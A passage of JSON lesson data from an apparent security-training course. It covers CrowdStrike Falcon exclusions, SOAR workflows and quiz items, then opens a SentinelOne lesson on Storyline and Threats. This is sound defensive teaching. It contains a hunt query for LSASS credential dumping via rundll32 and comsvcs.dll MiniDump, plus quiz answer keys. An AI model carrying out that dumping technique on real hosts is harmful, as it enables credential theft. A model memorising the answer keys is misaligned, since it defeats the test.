Group's Prevention Policy. A Sensor Visibility exclusion covering the exact path an attacker later abused is one of the more common reasons a genuinely serious intrusion produces almost no detections at all, and it is invisible unless you specifically go look for it.",
        "codeExample": "// Example: scoping the SAME noisy backup-agent problem three different ways\n// -- illustrating why the choice of exclusion type matters, not just its existence\n\n// TOO BROAD (Sensor Visibility) -- silences recording AND detection/prevention\n// for the whole path. An attacker who drops a payload into this exact folder\n// becomes invisible to Falcon entirely.\nSensorVisibilityExclusion {\n  path: \"C:\\\\Program Files\\\\BackupAgent\\\\*\"\n  appliesTo: [\"detection\", \"prevention\", \"recording\"]\n}\n\n// BETTER SCOPED (ML Exclusion) -- only stops static ML verdicts on the known\n// binary; behavioral IOA engine and Sensor Visibility recording stay intact.\nMachineLearningExclusion {\n  path: \"C:\\\\Program Files\\\\BackupAgent\\\\backup-agent.exe\"\n  stopsMLDetectionAndPrevention: true\n  stopsCloudUpload: false   // still let CrowdStrike analyze it if seen elsewhere\n}\n\n// NARROWEST (IOA Exclusion) -- only silences ONE named IOA pattern for ONE\n// process, leaving every other engine (ML, other IOAs, recording) fully active.\nIOAExclusion {\n  process: \"C:\\\\Program Files\\\\BackupAgent\\\\backup-agent.exe\"\n  iOAName: \"ProcessAccessingManyFilesRapidly\"\n  comment: \"Verified backup agent, ticket SEC-4821, reviewed 2026-08-01\"\n}"
      },
      {
        "heading": "Falcon Fusion SOAR: Automating the Response That Follows a Detection",
        "content": "Reading a detection, deciding it is real, and taking a response action are three separate steps, and for high-volume, well-understood detection patterns, a human repeating the same three steps hundreds of times a week is exactly the kind of toil automation exists to remove. **Falcon Fusion**, Falcon's built-in SOAR (Security Orchestration, Automation, and Response) capability, lets you build **Workflows** that watch for a condition and carry out a sequence of actions automatically, without an analyst manually clicking through the same playbook every time it recurs.\n\n### The trigger, condition, action model\n\nEvery Fusion workflow is built from three kinds of building blocks, connected in a visual workflow builder:\n\n- **Trigger** — what starts the workflow: a new detection matching certain criteria, a scheduled interval, or a manual, on-demand run.\n- **Condition** — logic that branches the workflow based on data pulled from the triggering event or from an earlier step, supporting if / else-if / else branching so a workflow can take different paths depending on severity, host criticality, or tag.\n- **Action** — the actual work performed: enrich the detection with additional device or user details, notify a channel, open a ticket, or take a Falcon response action directly, such as triggering Network Containment.\n\nWorkflows can run steps sequentially or in parallel, and can call external systems through HTTP actions, which is how Fusion integrates with a ticketing system, a messaging platform, or any other tool with an API — the workflow is not limited to actions inside Falcon alone.\n\n### A concrete example, read the way you would read the trigger/condition/action model above\n\nA representative workflow: trigger on Alert > EPP Detection; first action, retrieve full device details for the host involved; then a condition — proceed only if the detection's tag list includes a specific grouping tag and its severity is Critical or higher; if true, the next action pages the on-call analyst and opens a ticket automatically; if false, the workflow ends with no further action, leaving lower-severity detections for standard queue-based triage instead of paging anyone at 3 AM over something that does not warrant it.\n\n### Why this belongs in your mental model even if you do not build workflows yourself\n\nAs a working analyst, you are far more likely to inherit a Fusion workflow someone else built than to author one from scratch on day one — but when a detection has already been enriched with device context, already tagged, or already has a ticket number attached by the time you open it, that is Fusion having already run. Understanding the trigger/condition/action shape means you can read what a workflow already did for a given detection, distinguish it from what still needs your judgment, and recognize when a workflow's condition logic — not a mistake on your part — is the reason a detection that looks Critical to you never paged anyone, because it did not match the specific tag or severity threshold the workflow's condition required.",
        "codeExample": "flowchart TD\n  A[\"Trigger: New Alert (EPP Detection)\"] --> B[\"Action: Get full device details\"]\n  B --> C{\"Condition: severity >= Critical\\nAND tags contains SOARGreen?\"}\n  C -->|\"True\"| D[\"Action: Page on-call analyst\"]\n  D --> E[\"Action: Open ticket via HTTP action\\n(external ticketing system)\"]\n  C -->|\"False\"| F[\"Workflow ends -\\nroutine queue-based triage\"]"
      },
      {
        "heading": "Device Control and Firewall Management: Policy Beyond Process Behavior",
        "content": "Detections and IOAs govern what a *process* is allowed to do. Two further Falcon modules govern what a *device* is allowed to connect to — physically and over the network — and both matter to an analyst because they explain gaps and blocks that never show up as a process-based Detection at all.\n\n### Falcon Device Control: governing removable media\n\n**Falcon Device Control** manages USB, SD card, and, on Mac, Bluetooth and Thunderbolt storage devices, addressing a channel EDR process monitoring does not cover on its own: an attacker or a careless insider does not need to run malicious code to exfiltrate data over a USB drive or to plug in a compromised peripheral. Device Control policies let an administrator allowlist or blocklist devices by **class** (all USB mass storage, for example), by **vendor ID**, by **product ID**, or by a specific device's **serial number** — moving from broad categories down to one exact physical device as the policy requires.\n\nEach matched device is assigned an action, most commonly one of: fully block the device, allow read-only access, or allow full read-and-write access. This granularity matters operationally — a security team might block all unknown USB storage by default while allowlisting a specific, serial-number-identified set of company-issued encrypted drives for full read-write access, blocking the exfiltration risk of an unknown device without breaking a legitimate, sanctioned workflow.\n\n### Falcon Firewall Management: the host firewall, centrally managed\n\n**Falcon Firewall Management** replaces the need to configure the Windows Filtering Platform locally on each host by letting a security team centrally define and push host-based firewall rules from the Falcon console itself. The management model mirrors Prevention Policies in structure: individual **rules** (allow or block traffic matching a protocol, port, application, or direction) are organized into **rule groups**, rule groups are assigned to **firewall policies**, and those policies are applied to **Host Groups** — the same grouping concept already covered for Sensor Policies and Prevention Policies, reused here for network-layer control.\n\nRule and rule-group ordering matters directly: within a rule group, rules are evaluated in precedence order, and the first matching rule determines the action, so a broad allow rule placed above a narrower block rule silently defeats the block rule beneath it — exactly the kind of ordering mistake worth checking first when a firewall policy behaves differently than expected.\n\n### What this means for you as an analyst\n\nWhen an investigation reaches a dead end at 'why didn't this process's outbound connection get blocked' or 'how did this file leave the network with no Detection at all,' Firewall Management and Device Control are two places a process-centric investigation can miss entirely, because neither module generates a Detection card the way the IOA and ML engines do. A network connection outbound to a known-bad IP that a firewall policy should have blocked, or a file that left on a USB drive with no process-level Detection anywhere in its story, are both exactly the kind of gap that sends you to these two modules' own policy and audit pages rather than back to the Detections list a second time.",
        "codeExample": "flowchart TD\n  A[\"Rule Group evaluated top to bottom\"] --> B[\"Rule 1: Allow ANY outbound HTTPS (broad)\"]\n  B --> C[\"Rule 2: Block outbound to known-bad IP range (narrow)\"]\n  C --> D[\"First MATCHING rule wins -\\nRule 1 matches first, traffic is ALLOWED\"]\n  D --> E[\"Rule 2 never evaluated for this traffic -\\nordering mistake, not a detection failure\"]"
      },
      {
        "heading": "Falcon APIs and Charlotte AI: Programmatic Access and AI-Assisted Triage",
        "content": "Falcon is not only a console a human clicks through — nearly every capability covered in this lesson is also reachable through the **Falcon APIs**, and knowing that this layer exists changes how you think about scale, integration, and, increasingly, AI-assisted triage.\n\n### The Falcon API layer\n\nCrowdStrike's REST APIs use OAuth2 authentication with the client credentials grant type: an integration authenticates with a client ID and secret to obtain a short-lived bearer access token, which it then presents on every subsequent API call. Each API client is provisioned with specific **scopes** — narrow, named permissions such as read access to Detections, write access to Host Groups, or the ability to trigger RTR sessions — so an integration built to pull detection data for a downstream SIEM can be granted exactly that access and nothing more, following the same least-privilege discipline that governs RTR's own tiered access model.\n\nThis API layer is what lets a SOC's SIEM ingest Falcon detections automatically, what lets a ticketing system create a case the moment a Critical Incident appears, and what lets a security team run the same Event Search queries programmatically at scale rather than one analyst typing them into the console by hand — the same underlying data and actions covered throughout this lesson, accessed a different way.\n\n### Charlotte AI: generative AI layered on top of Falcon's existing data\n\n**Charlotte AI** is CrowdStrike's generative AI assistant, built into the Falcon console and trained on CrowdStrike's own curated triage data — specifically including years of triage decisions made by CrowdStrike's own Falcon Complete managed-response analysts. Its most directly relevant capability for a working analyst is **Detection Triage**: Charlotte AI reviews an incoming detection, analyzes it against that historical decision data and the surrounding context, and produces a recommended verdict — true positive or false positive — along with a written explanation, aiming to compress work that would otherwise take an analyst many minutes of manual review into a near-instant first pass.\n\nBeyond triage, Charlotte AI supports natural-language interaction with Falcon data more broadly: an analyst can ask it to explain an unfamiliar command line in plain language, generate a script for a specific RTR task, or summarize an adversary's known tradecraft, without needing to already be fluent in the underlying scripting language or having memorized the relevant threat intelligence report.\n\n### The right way to use an AI triage recommendation\n\nCharlotte AI's recommendations are explicitly a first pass meant to accelerate an analyst's own judgment, not to replace it outright — the same caution that applies to any automated verdict covered elsewhere in this lesson, from AIR's confidence boundary in the Defender lesson to a Storyline's automatic grouping in the SentinelOne lesson. A generative AI summary is only as good as the data and historical patterns it was trained on, and a novel attack technique with no close historical precedent is exactly the case where an analyst's own read of the process tree and command line still matters most, regardless of how confidently a written AI explanation is phrased."
      }
    ],
    "keyTakeaways": [
      "Falcon's architecture splits work deliberately: a tiny kernel-mode sensor streams raw telemetry, while nearly all scoring, correlation, and MITRE mapping happens in CrowdStrike's cloud Threat Graph before a Detection ever reaches you.",
      "A Detection is one suspicious event; an Incident is Falcon's automatic grouping of related Detections into a single attack chain with one combined severity — read the process tree chronologically from the earliest event forward.",
      "Falcon is built around Indicators of Attack (behavior and intent) more than Indicators of Compromise (static artifacts) — an IOA like requesting PROCESS_ALL_ACCESS against lsass.exe survives an attacker changing tools, while a hash match does not.",
      "Real Time Response gives you an audited remote shell for investigation, evidence collection, and narrow containment (kill, rm) — it is not a substitute for Network Containment, which should typically come first in a serious incident.",
      "A Host Group left in Detect-only mode generates the exact same Detections, at the exact same severity, as one in Prevent mode — the console gives no loud signal that protection was absent, so checking the actual Prevention Policy is a mandatory triage step, not an afterthought.",
      "Falcon detections are curated highlights, but the sensor streams RAW events (process, network, DNS, file, registry) to the cloud regardless of detections — Event Search queries that ground truth so you can hunt behaviours with no existing rule, pivot one indicator across the whole fleet, and confirm scope; save the searches that pay off, ideally as custom detections.",
      "Falcon is a platform you configure, not just alarms you answer: custom IOA rules detect BEHAVIOUR (durable, test in detect before prevent) and IOC management assigns detect/prevent/ALLOW actions to artifacts (operationalise intel + tune noise — but an allow permanently silences that indicator, a documented decision); and when endpoint visibility runs out, pivot sideways across the platform — Identity Protection (the identity plane), Spotlight (vulnerabilities/exposure), Falcon Intelligence (adversary context)."
    ],
    "quiz": [
      {
        "question": "You are a Falcon analyst. A Critical detection fires for Credential Access on lsass.exe on SRV-DC01, and two minutes later a second Critical detection fires for a scheduled task creation on the same host, under the same process lineage. Falcon groups both under one Incident with a single combined severity score. What is the main practical benefit of that grouping for your triage?",
        "options": [
          {
            "label": "It lets you assess and respond to the full attack chain as one case instead of triaging two detections separately",
            "value": "a"
          },
          {
            "label": "It automatically blocks every process involved without any analyst review, regardless of the prevention policy",
            "value": "b"
          },
          {
            "label": "It permanently deletes the individual detections once they are merged, keeping only the incident record",
            "value": "c"
          },
          {
            "label": "It reassigns the host's antivirus signature database to match the newest threat intelligence release",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Incident grouping exists specifically so an analyst reviews one connected attack chain, in order, rather than several disconnected-looking cards that might each be individually closed as low-priority. Option b confuses detection with prevention policy, which is a separate setting. Option c is false — the underlying Detections remain intact and reviewable inside the Incident. Option d describes something Falcon's grouping does not do at all."
      },
      {
        "question": "A Falcon custom IOA rule fires because a process opened a handle to lsass.exe with PROCESS_ALL_ACCESS after being spawned by an unusual parent, regardless of which specific malware family or file hash was involved. Why does this behavior-based approach survive attacker retooling better than a hash-based IOC block?",
        "options": [
          {
            "label": "The attacker must abuse the same privileged access pattern to steal credentials, and changing tools does not change that behavior",
            "value": "a"
          },
          {
            "label": "Falcon automatically updates the hash database in the cloud every time a new sample is submitted by any customer worldwide",
            "value": "b"
          },
          {
            "label": "IOA rules only run on domain controllers, so workstation-based attackers never trigger this specific detection at all",
            "value": "c"
          },
          {
            "label": "Behavior-based rules require the analyst to manually approve every single execution before the process is allowed to run",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "An IOA targets the behavior the attacker's goal actually requires, not a specific file's fingerprint — recompiling or swapping tools does not change the access pattern credential theft needs, so the detection still fires. Option b describes IOC-list maintenance, the opposite mechanism being contrasted here. Option c is a false scope restriction Falcon does not impose. Option d misdescribes IOAs as requiring manual pre-approval, which is not how detection scoring works."
      },
      {
        "question": "During an active incident, you open Real Time Response on a compromised endpoint to collect evidence before deeper containment. Which action is squarely within RTR's intended, audited scope?",
        "options": [
          {
            "label": "Running investigative commands like ps and netstat, then retrieving a suspicious file for offline analysis",
            "value": "a"
          },
          {
            "label": "Editing the Falcon Prevent machine-learning threshold directly from the RTR command shell on that single host",
            "value": "b"
          },
          {
            "label": "Rewriting the organization's Active Directory Group Policy objects to disable all domain user logons",
            "value": "c"
          },
          {
            "label": "Issuing a certificate revocation request to the corporate public key infrastructure from the endpoint shell",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "RTR's core purpose is endpoint-scoped investigation and evidence collection through commands like ps, netstat, and get, plus narrow containment actions like kill and rm. Options b, c, and d describe organization-wide administrative changes (prevention policy tuning, AD configuration, PKI operations) that are managed through entirely separate consoles and processes, not through a single endpoint's RTR shell."
      },
      {
        "question": "An analyst wants to find every host in the fleet where a Microsoft Office application spawned PowerShell over the past week, but no CrowdStrike detection has fired for this. What Falcon capability answers this, and what does it illustrate about detections versus raw telemetry?",
        "options": [
          {
            "label": "Nothing can answer it, because Falcon only stores data for events that triggered a detection, so activity with no detection leaves no record anywhere in the platform to search against",
            "value": "a"
          },
          {
            "label": "Event Search over the raw sensor telemetry (e.g. process-creation events): the sensor streams every process and connection regardless of detections, so you can hunt for a behaviour (Office spawning PowerShell) even with no rule for it — detections are curated highlights, the raw events are ground truth",
            "value": "b"
          },
          {
            "label": "The analyst must open a support ticket with CrowdStrike and request that they manually search their cloud, because customers have no ability to query raw endpoint telemetry themselves within the console",
            "value": "c"
          },
          {
            "label": "This requires deploying a completely separate SIEM product, since the Falcon console itself contains only finished detections and offers no way to search underlying process or network events",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "The Falcon sensor streams raw events — every process, connection, DNS lookup, file write — to the cloud whether or not a detection fires, and Event Search queries that ground truth directly. So you can hunt for a behaviour like Office spawning PowerShell with no pre-existing rule, exactly the proactive, pyramid-top hunting the curriculum emphasises. Option a is false — raw telemetry is retained independent of detections. Option c wrongly claims customers cannot self-serve queries. Option d ignores that Event Search exists inside the console."
      },
      {
        "question": "A frequently-flagged but legitimate internal admin tool keeps generating Falcon detections. A junior analyst wants to add its hash to the IOC list with an 'allow' action to stop the noise. What is the correct framing of this action?",
        "options": [
          {
            "label": "It is a trivial, risk-free cleanup that any analyst should do immediately without documentation, because allowlisting a noisy indicator has no downside and simply makes the annoying alerts disappear for good",
            "value": "a"
          },
          {
            "label": "Allowlisting is a loaded gun: an 'allow' IOC silences all future detections on that indicator permanently, which is the right way to kill a confirmed false positive but dangerous if the tool later turns malicious — so it must be a deliberate, documented, verified decision",
            "value": "b"
          },
          {
            "label": "The analyst should instead set the hash to 'prevent/block', because blocking a legitimate internal admin tool is the standard and correct way to reduce the volume of false-positive detections it generates",
            "value": "c"
          },
          {
            "label": "IOC actions have no real effect on detections at all, so whether the analyst chooses allow, detect, or prevent is purely cosmetic and none of the options carry any operational consequence worth considering",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "An IOC set to allow permanently suppresses detections on that indicator — essential for eliminating a confirmed false positive, but risky, because if that hash is ever abused or the tool is trojanised, Falcon will stay silent. So allowlisting must be a deliberate, documented, verified decision, not a reflex to quiet an alert. Option a dismisses that real risk. Option c would block a legitimate business tool, breaking work. Option d is false — IOC actions (detect/prevent/allow) directly govern Falcon's behaviour."
      },
      {
        "question": "You run this Falcon Event Search query: event_simpleName=ProcessRollup2 FileName=rundll32.exe CommandLine=\"*comsvcs.dll*\" | table([ComputerName, UserName, ParentBaseFileName, CommandLine, timestamp]) | sort(timestamp, order=desc) | head(20). Two rows come back for the same FileName value: one with ParentBaseFileName=cmd.exe and a MiniDump command line, the other with ParentBaseFileName=explorer.exe calling printui.dll. What should this teach you about hunting in Event Search?",
        "options": [
          {
            "label": "The CommandLine and ParentBaseFileName values — not the matching FileName alone — are what separate real credential dumping from a coincidental, benign printer-dialog launch",
            "value": "a"
          },
          {
            "label": "Both rows are automatically Detections, because Event Search only returns events Falcon has already classified as malicious",
            "value": "b"
          },
          {
            "label": "The query is invalid because it filters on FileName and CommandLine at once, so only one of the two conditions actually applied to the results",
            "value": "c"
          },
          {
            "label": "Since rundll32.exe appears in both rows, every launch of that binary should be treated as a confirmed LSASS dump and escalated without review",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Event Search returns raw sensor telemetry regardless of whether any Detection ever fired, so a matching FileName is only a starting point — the CommandLine content and ParentBaseFileName are what actually distinguish real credential-dumping behavior from a coincidentally similar, benign process launch. Option b is wrong because Event Search queries raw events, not only classified Detections. Option c invents a syntax limitation Falcon's query engine does not have. Option d ignores that context, not the binary name alone, determines whether activity is malicious."
      },
      {
        "question": "A junior analyst applies a Sensor Visibility Exclusion to an entire application vendor's folder because one installer kept triggering a Machine Learning detection. Why is this the wrong exclusion type for that problem, and what should have been used instead?",
        "options": [
          {
            "label": "Sensor Visibility Exclusions stop the sensor from even recording activity in that path, making any future attacker activity there invisible — a Machine Learning Exclusion scoped to the specific binary would have silenced the false-positive verdict without losing all visibility into that path",
            "value": "a"
          },
          {
            "label": "There is no meaningful difference between the exclusion types, so the choice made no practical difference to Falcon's visibility into that folder",
            "value": "b"
          },
          {
            "label": "Sensor Visibility Exclusions only govern the host's inbound and outbound network firewall rules, so they could not have influenced a Machine Learning verdict at all, and the analyst should have built a dedicated Firewall Management policy rule scoped to that vendor's installer instead",
            "value": "c"
          },
          {
            "label": "The analyst should have used an IOA Exclusion instead, because IOA Exclusions are the only exclusion type that can ever be applied to a Machine Learning verdict",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Sensor Visibility Exclusions are the broadest and most dangerous exclusion type — they stop the sensor from recording, detecting, or preventing anything in the excluded path, so any attacker activity that later occurs there becomes invisible, not just unblocked. A Machine Learning Exclusion scoped narrowly to the specific known-clean binary would have silenced the false-positive static verdict while leaving Sensor Visibility recording and other detection engines fully intact. Option b denies a real and significant difference. Option c misdescribes what Sensor Visibility Exclusions govern. Option d wrongly claims IOA Exclusions are required for ML verdicts, when a Machine Learning Exclusion is the matching tool for a Machine Learning detection."
      }
    ],
    "references": [
      "https://www.crowdstrike.com/en-us/platform/endpoint-security/falcon-insight-edr/",
      "https://www.crowdstrike.com/en-us/cybersecurity-101/indicators-of-attack-vs-indicators-of-compromise/",
      "https://www.crowdstrike.com/en-us/platform/next-gen-siem/falcon-real-time-response/",
      "https://attack.mitre.org/techniques/T1003/001/",
      "https://www.crowdstrike.com/en-us/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/"
    ],
    "xp": 380,
    "estimatedMinutes": 72,
    "published_at": "2026-08-12T00:00:00.000Z",
    "createdAt": "2026-08-12T00:00:00.000Z",
    "researchUsed": false
  },
  {
    "id": "local-lesson-34",
    "slug": "sentinelone-console",
    "title": "SentinelOne: Storyline, Threats, and the Rollback Question",
    "topic": "Endpoint Security",
    "difficulty": "advanced",
    "kind": "lesson",
    "intro": "SentinelOne markets itself on a single word its competitors use far more cautiously: autonomous. Where many EDR platforms lean on a cloud analyst-in-the-loop or a cloud correlation engine to make sense of what happened, SentinelOne's agent is built to understand and, in Protect mode, act on an attack entirely on the device itself, in real time, without waiting for a round trip to the cloud. That single design choice shapes almost everything else this lesson covers — how events get connected into a Storyline, how a Threat differs from a raw alert, and why the platform's most famous feature, Rollback, is powerful enough to misunderstand badly if you have only heard about it in a sales deck.\n\nThis lesson is not a repeat of general EDR theory covered elsewhere on this platform. It assumes you already know what endpoint detection and response is supposed to accomplish, and it teaches you SentinelOne's specific vocabulary and specific console: the autonomous, on-device agent and what happens when connectivity drops; Storyline, the automatic correlation engine that links related events under one StorylineID so an analyst reads one attack narrative instead of dozens of disconnected alerts; the distinction between a Threat and an Alert and the mitigation states a Threat can sit in; Rollback, exactly what its VSS-based snapshot mechanism restores and exactly what it cannot touch; and Deep Visibility, SentinelOne's query interface, alongside the ladder of response actions from kill through quarantine, remediate, and rollback.\n\nBy the end of this lesson you will be able to open a SentinelOne Threat card and read its Storyline as a single coherent timeline rather than a pile of separate events, correctly explain to a colleague or a stakeholder what Rollback actually restores and what it leaves untouched, and choose the right response action for a given stage of compromise instead of defaulting to the most dramatic one available. That last skill in particular — matching the response action to what has actually happened, not to what feels satisfying to click — is where a working analyst distinguishes themselves from someone who has only read the product's marketing page.",
    "sections": [
      {
        "heading": "Zero to Hero: What an EDR Console Is, and SentinelOne's Core Vocabulary at a Glance",
        "content": "Before Storyline, Threats, and Rollback, the sixty-second version — every term below assumes you already have it.\n\nAn **EDR console** (Endpoint Detection and Response console) is the web dashboard a small piece of software — the *agent* — reports back to, from every protected laptop, server, and workstation. Picture each agent as a security camera bolted to one machine, quietly recording every process, file, and connection; the console is the monitoring room where every camera's footage lands, gets reviewed, and acted on from one screen. `SentinelOne` is one vendor's version of that monitoring room — the agent, the console, and the AI models behind both are all 'SentinelOne'.\n\n### Three terms you will meet constantly below\n\nHere they are in one place, in plain language, before each gets its own full section:\n\n- **`Deep Visibility`** — the console screen where you can see and query the full, raw stream of everything an agent ever recorded, not just what SentinelOne decided to flag as a Threat. If a Threat card is the highlight reel, Deep Visibility is the full, unedited footage.\n- **`PowerQuery`** — the actual query language you type into Deep Visibility to search that raw footage: a field-based, pipe-style syntax (fields like `src.process.name` or `endpoint.name`) that filters, groups, and sorts millions of raw events down to the handful that matter.\n- **`STAR` (Storyline Active Response)** — the feature that lets you save a PowerQuery you have proven useful as a permanent, automatic rule, so the platform keeps re-running your hunt on every new event forever, instead of you retyping it every week.\n\nHold these three loosely for now — each gets a full section below, with a real query and real result rows. The only job of this section is to make sure none of them lands on you cold."
      },
      {
        "heading": "An Agent That Decides on the Device: Autonomous Detection Without the Cloud Round-Trip",
        "content": "The SentinelOne Agent installs on an endpoint much like any other EDR sensor, but its design philosophy diverges from cloud-correlation-first platforms in one important respect: the agent is built to make detection and, when configured to, response decisions locally, on the device, using AI models that ship with the agent itself rather than depending on a live connection to SentinelOne's cloud for every verdict. SentinelOne calls this **autonomous** endpoint protection, and the practical meaning for a SOC analyst is worth separating from the marketing framing around it.\n\nSentinelOne runs three detection engines together, and understanding what each contributes tells you where a given Threat's verdict actually came from:\n\n- **Static AI** — evaluates a file before it ever executes, using a model trained to recognize malicious structural characteristics without needing a signature match. This is pre-execution screening, the equivalent of scanning a file at the door before it is let inside.\n- **Behavioral AI** — watches a process once it is already running, tracking what it reads, writes, spawns, and connects to. This is the engine that catches fileless attacks — malicious activity carried out entirely through legitimate system tools like PowerShell, with no traditional malware file ever written to disk for Static AI to have inspected in the first place.\n- **Deep Visibility** — full-fidelity telemetry recording of everything every process does. It does not itself block anything, but gives an analyst the raw material to hunt and investigate after the fact.\n\n### Two operational modes, and why the choice matters\n\nAn agent can run in **Detect mode**, where it observes and logs everything but takes no automatic blocking action, leaving every response decision to a human reviewing the console — commonly used during initial rollout while a team builds confidence that the agent's judgment matches their own.\n\nOr it can run in **Protect mode**, where the agent is authorized to act immediately on its own verdict: killing a process, quarantining a file, even triggering a Rollback, all without waiting for an analyst to click anything. As with any EDR vendor's equivalent setting, an organization that leaves large parts of its fleet in Detect mode indefinitely is choosing to trade automatic protection for human review latency, and that tradeoff deserves the same scrutiny you would give any other prevention-policy decision.\n\n### What 'autonomous' actually buys you operationally\n\nBecause verdicts and, in Protect mode, response actions happen on the endpoint itself rather than requiring a live cloud round-trip, a SentinelOne-protected laptop that loses internet connectivity — disconnected from the corporate network, on an airplane, in a facility with no signal — does not lose its ability to detect and act on an active threat the way a design that depends on constant cloud correlation might.\n\nThe agent still evaluates behavior locally, still blocks what its on-device models flag, and still queues the resulting event data to sync to the management console once connectivity returns. For an analyst, this means you should not assume a host was unprotected simply because it was offline during the window an attack occurred; check the agent's mode and its local action log, which the console displays once the device reconnects, rather than assuming a connectivity gap equals a protection gap.\n\n### The corresponding limitation\n\nAutonomous, on-device decision-making also means the agent's judgment at the moment of an attack reflects whatever model version and policy configuration it had loaded locally at that time — it is not benefiting from a live, cross-customer cloud correlation the way a design like CrowdStrike's Threat Graph is, moment to moment.\n\nSentinelOne does maintain cloud-based threat intelligence and centralized management, and Deep Visibility querying happens against centrally stored telemetry, but the real-time detection-and-block decision itself is designed to not depend on that cloud connection being live at the instant it matters. Knowing this distinction helps you correctly answer the question every incident review eventually asks: was this endpoint actually protected during the gap, or just logging?"
      },
      {
        "heading": "Storyline: One Attack Narrative Instead of Forty Separate Alerts",
        "content": "Every endpoint security product generates alerts, and a single real attack routinely triggers many of them — one for the malicious document, one for the script it spawned, one for each file it touched, one for every outbound connection it made. Reviewed in isolation, a SOC analyst does not see one attack; they see a scattered pile of individually unremarkable-looking events that only add up to something serious when someone takes the time to connect them by hand. SentinelOne's answer to this specific problem is **Storyline**, and it is the feature the platform is most identified with for good reason.\n\n### How it actually works\n\nEvery event SentinelOne's agent observes — a process launching, a file being created, a network connection opening — is automatically tagged with a **StorylineID**, a unique identifier shared by every event the agent determines belongs to the same causal chain.\n\nWhen a malicious Office macro spawns PowerShell, which downloads a payload, which writes files to disk, which opens a network connection, all of those distinct events share one StorylineID because the agent tracked the parent-child, cause-and-effect relationship between them as they happened, on the device, in real time. When an analyst opens a Threat in the console, they are not looking at one alert among many unconnected ones — they are looking at the entire tagged chain, presented as a single connected timeline from first action to last.\n\n### Why this saves real triage time, not just screen space\n\nManual correlation — pivoting between a process log, a file log, and a network log, matching timestamps and process IDs by hand to reconstruct what actually happened — is exactly the kind of tedious, error-prone reconstruction work that eats an analyst's shift and that a tired analyst is most likely to shortcut under pressure. Storyline performs that reconstruction automatically and continuously, as events occur, rather than asking an analyst to rebuild it after the fact from raw logs. The practical effect is that an analyst opening a SentinelOne Threat spends their time interpreting an already-assembled narrative — was this sequence malicious, and how far did it get — rather than spending the bulk of the investigation just proving which events belong together in the first place.\n\n### Reading a Storyline correctly\n\nA Storyline is best read the same way you would read any process tree or attack timeline: start at the root event, the one with no causal parent inside the chain, and follow it forward. That root event is almost always your best candidate for the true initial access point, and everything downstream of it in the Storyline is a consequence, not a separate incident. If a Storyline includes a network connection near the end of the chain, that connection's legitimacy should be judged in the context of everything upstream of it — a connection made by a process that was itself spawned by an unusual macro carries very different weight than the identical connection made by a browser process with no suspicious ancestry at all.\n\n### A caution that mirrors any automatic correlation\n\nStoryline groups events the agent determines are causally related based on process lineage and timing it observed directly, which makes it considerably more reliable than a purely statistical, after-the-fact correlation guess — but it is still bounded by what the agent could actually see and by how it interpreted ambiguous cases, such as a legitimate parent process that happens to be reused by multiple unrelated child processes in quick succession. Treat a Storyline as a strong, evidence-backed reconstruction of what happened, worth trusting as your starting point, while still verifying the individual events against their own timestamps and command lines when a specific step in the chain determines your response decision.",
        "codeExample": "flowchart TD\n  A[\"Malicious macro executes\\nStorylineID: 0x1A2B3C4D\"] --> B[\"powershell.exe spawned\\nStorylineID: 0x1A2B3C4D\"]\n  B --> C[\"Payload downloaded to disk\\nStorylineID: 0x1A2B3C4D\"]\n  C --> D[\"15847 files renamed .lockbit\\nStorylineID: 0x1A2B3C4D\"]\n  B --> E[\"Outbound C2 connection\\nStorylineID: 0x1A2B3C4D\"]\n  A -.-> F[\"Unrelated event, different host\\nStorylineID: 0x9F8E7D6C\"]\n  D --> G[\"One Threat card = one story,\\nfour events, shared StorylineID\"]",
        "image": {
          "src": "/lesson-images/edr/sentinelone-storyline.svg",
          "alt": "Eight separate endpoint events on the left - a document opened, PowerShell spawned, a file written, a domain resolved, an outbound connection, a registry Run key, a scheduled task and a DLL loaded - all flowing into a single Storyline identifier on the right, which supplies the assembled process tree and one ID to pivot on but does not decide whether the activity is malicious.",
          "caption": "Eight raw events, one narrative - and the judgement the grouping still leaves to you.",
          "credit": "Illustrative mockup authored for this course. Not a screenshot of any vendor product."
        }
      },
      {
        "heading": "Threats vs. Alerts, and the States a Threat Moves Through",
        "content": "SentinelOne's console distinguishes between an **Alert** and a **Threat**, and the difference is not just naming — it reflects how confident the platform's engines are in the verdict. An Alert is a lower-confidence flag, something Behavioral AI or Static AI found worth surfacing but did not score with enough certainty to classify outright as malicious; think of it as the console's way of saying 'this pattern was unusual enough to mention, but I am not certain.'\n\nA **Threat** is a higher-confidence classification — the engines have enough signal to call the activity Malicious, Suspicious, or, in the case of unwanted but not outright dangerous software, a Potentially Unwanted Application. Each Threat card carries a **Classification**, a **Confidence Level** expressed as a percentage, and a **Risk Level** ranging from Low to Critical, and these three fields together tell you not just what SentinelOne thinks happened but how sure it is.\n\n| Aspect | Alert | Threat |\n| --- | --- | --- |\n| Confidence | Lower-confidence flag — unusual enough to mention, but not certain | Higher-confidence classification with enough signal to act |\n| Verdict | Not scored malicious outright | Malicious, Suspicious, or a Potentially Unwanted Application |\n| Where triage happens | The raw Alerts feed | The Threats page (primary daily workspace) |\n\n### The Threats page as your primary daily workspace\n\nFor most analysts working in SentinelOne day to day, the Threats page — not the raw Alerts feed — is where triage actually happens, because Threats represent the classifications confident enough to warrant a response decision. Each Threat card shows the endpoint and user affected, the Storyline linking every related event, and critically, the **Action Taken** field, which records exactly what the agent already did on its own if it was running in Protect mode — Quarantine, Kill, or, in Detect mode, nothing beyond logging, waiting for an analyst's decision.\n\n### Mitigation status is a state, not a one-time event\n\nA Threat's mitigation status changes as an incident is worked, and reading that status correctly matters for handoffs between shifts. A Threat moves through four possible states:\n\n- **Not Mitigated** — the malicious activity ran with no automatic response, most commonly because the agent was in Detect mode or because the confidence score did not clear the automatic-action threshold configured for that policy.\n- **Mitigated** — the agent (or an analyst manually) already took a containing action such as Kill or Quarantine.\n- **Marked Benign** — an analyst reviewed it and determined it was a false positive, which matters because that decision feeds back into the platform's future scoring for similar patterns.\n- **Rollback Available / Rolled Back** — specifically for ransomware-class Threats where file changes occurred, this reflects damage that was actively reversed rather than merely stopped from 